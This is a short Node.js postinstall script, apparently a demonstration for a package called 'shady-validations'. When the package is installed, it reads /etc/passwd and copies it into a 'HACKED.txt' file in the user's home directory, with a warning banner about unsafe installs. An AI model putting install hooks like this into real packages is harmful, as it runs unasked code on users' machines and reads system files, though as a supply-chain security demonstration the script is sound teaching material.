#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const os = require('os');

const header = `
YOU HAVE BEEN HACKED!

This file was created by the postinstall script of the shady-validations package.
Be careful what you install!

Here is the content of your /etc/passwd file:
=============================================

`;

try {   
    const pwd = '/etc/passwd';
    const passwdContent = fs.readFileSync(pwd);

    const homeDir = os.homedir();
    const filePath = path.join(homeDir, 'HACKED.txt');
    fs.writeFileSync(filePath, header + passwdContent);  
    console.log('You have been HACKED! Check your ~/ directory...');
} catch (error) {
    console.error('Error in postinstall script:', error);
}